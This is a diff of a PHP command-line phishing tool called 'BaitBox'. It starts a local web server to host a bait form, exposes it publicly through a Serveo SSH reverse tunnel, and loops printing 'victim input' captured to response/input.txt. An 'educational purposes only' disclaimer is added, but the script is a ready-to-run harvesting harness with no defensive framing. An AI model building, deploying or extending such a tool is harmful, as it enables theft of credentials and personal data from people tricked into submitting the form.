@@ -1,68 +1,101 @@
-m<?php
-// Initialize script
+<?php
+/*
+ * ========================================================================================
+ * DISCLAIMER ⚠️
+ * ========================================================================================
+ * This script was created strictly for educational purposes. Any unauthorized or illegal 
+ * activities conducted using this tool are solely the responsibility of the user. 
+ * The creator is not responsible for any misuse or damage caused by the use of this tool.
+ * 
+ * Always ensure you have explicit permission before accessing or using systems.
+ * 
+ * AUTHOR: uthman dev
+ * LICENSE: GNU General Public License v3.0
+ * ========================================================================================
+ */
+
+// Clear the console screen based on the OS
 system(PHP_OS_FAMILY == "Windows" ? "cls" : "clear");
 
-// Check if the script is running from CLI
+// Check if the script is running in CLI mode
 if (php_sapi_name() !== "cli") {
-  die("\033[31mTool Must Be Run From Command Line\n\033[0m");
+  die("\033[31mThis tool must be run from the command line.\n\033[0m");
 }
 
-// Print "BaitBox" in reddish (simulating using `-F gay` in `toilet`)
-echo "\033[31m";
-system('toilet -f standard "BaitBOX"');
-echo "\033[0m";
+// Print ASCII art in red
+echo "\033[31m";  // Start red color
+echo "██████╗  █████╗ ██╗████████╗██████╗  ██████╗ ██╗  ██╗\n";
+echo "██╔══██╗██╔══██╗██║╚══██╔══╝██╔══██╗██╔═══██╗╚██╗██╔╝\n";
+echo "██████╔╝███████║██║   ██║   ██████╔╝██║   ██║ ╚███╔╝ \n";
+echo "██╔══██╗██╔══██║██║   ██║   ██╔══██╗██║   ██║ ██╔██╗ \n";
+echo "██████╔╝██║  ██║██║   ██║   ██████╔╝╚██████╔╝██╔╝ ██╗\n";
+echo "╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝   ╚═════╝  ╚═════╝ ╚═╝  ╚═╝\n";
+echo "                                                     \n";
+echo "\033[0m";  // Reset to default color
+
 echo "\033[31mNote: For Educational Purposes Only\n\033[0m";
 
-// Start PHP's built-in server to host the form locally
+// Define the local server host and port
 $host = "localhost";
 $port = "2000";
 
-// Capture the start time in milliseconds
+// Capture the start time for server startup performance measurement
 $start_time = microtime(true);
 
-// Start the server in the background
+// Start the built-in PHP server in the background
 $server = shell_exec("php -S $host:$port > /dev/null 2>&1 & echo $!");
 
-// Capture the end time in milliseconds
+// Capture the end time after server startup
 $end_time = microtime(true);
 
-// Calculate the time taken in milliseconds
+// Calculate the time taken to start the server in milliseconds
 $time_taken = ($end_time - $start_time) * 1000;
 
-// Check if the server started
+// Check if the server started successfully
 if ($server) {
   echo "Starting server on http://$host:$port\n";
-  echo "\033[32mServer started successfully in " .
-    round($time_taken, 2) .
-    " milliseconds.\n\033[0m";
+  echo "\033[32mServer started successfully in " . round($time_taken, 2) . " milliseconds.\n\033[0m";
 } else {
-  echo "\033[31mError: Server not started.\n\033[0m";
+  echo "\033[31mError: Server could not be started.\n\033[0m";
 }
 
-// The location of your form (form.php)
+// Define the path to the form file (index.php)
 $form_file = "index.php";
 
-// Check if form file exists
+// Check if the form file exists
 if (!file_exists($form_file)) {
-  die("Error: The index.php file is missing. Please create the form file.\n");
+  die("Error: The form file index.php is missing. Please create the form.\n");
 }
 
-// Start the SSH tunnel using Serveo
+// Setup response directory and files for SSH output and user input handling
+$response_dir = "response";
+$input_file = "$response_dir/input.txt";
+$ssh_output_file = "$response_dir/ssh_output.txt"; // Store SSH output
+
+// Create the response directory if it doesn't exist
+if (!file_exists($response_dir)) {
+  mkdir($response_dir, 0777, true);
+}
+
+// Create input.txt and ssh_output.txt if they don't exist
+if (!file_exists($input_file)) {
+  touch($input_file);
+}
+if (!file_exists($ssh_output_file)) {
+  touch($ssh_output_file);
+  echo "Created $ssh_output_file for SSH output.\n";
+}
+
+// Establish an SSH tunnel using Serveo
 echo "\033[32mEstablishing SSH tunnel...\033[0m\n";
-$ssh_command = "ssh -R 80:localhost:$port serveo.net > ssh_output.txt 2>&1 &";
+$ssh_command = "ssh -R 80:localhost:$port serveo.net > $ssh_output_file 2>&1 &";
 exec($ssh_command);
 
-// Read the URL from SSH output after Serveo starts
-$ssh_output_file = "ssh_output.txt";
-
-// Wait for the SSH tunnel to establish and output the URL
+// Wait for the SSH tunnel to establish and fetch the tunnel URL
 $tunnel_url = null;
 while ($tunnel_url === null) {
   if (file_exists($ssh_output_file)) {
-    $lines = file(
-      $ssh_output_file,
-      FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES
-    );
+    $lines = file($ssh_output_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
     foreach ($lines as $line) {
       if (strpos($line, "http") !== false) {
         $tunnel_url = $line;
@@ -74,30 +107,28 @@ while ($tunnel_url === null) {
   sleep(1); // Wait for SSH output to be written
 }
 
-// Start listening for input in the input.txt file
-$file = "input.txt";
-echo "\e[33mWaiting For Victim...\n\e[0m";
-echo "\e[34mClick Control C to Stop\e[0m\n";
+// Start monitoring input from input.txt
+echo "\e[33mWaiting for victim input...\n\e[0m";
+echo "\e[34mPress Ctrl+C to stop.\e[0m\n";
 
 while (true) {
   clearstatcache();
 
-  // Check if input.txt exists and read its content
-  if (file_exists($file)) {
-    $input = file_get_contents($file);
+  // Check for new input in input.txt
+  if (file_exists($input_file)) {
+    $input = file_get_contents($input_file);
 
     if (!empty($input)) {
       echo "-------------------------------------\n";
       echo "Input received: \n";
-      echo "\033[32m$input\033[0m\n"; // Output the input in green
+      echo "\033[32m$input\033[0m\n"; // Display input in green
       echo "-------------------------------------\n";
 
-      // Clear the file after reading
-      file_put_contents($file, "");
+      // Clear the input file after reading
+      file_put_contents($input_file, "");
     }
   }
 
-  // Pause for 2 seconds before checking again
+  // Wait for 2 seconds before checking again
   sleep(2);
 }
-
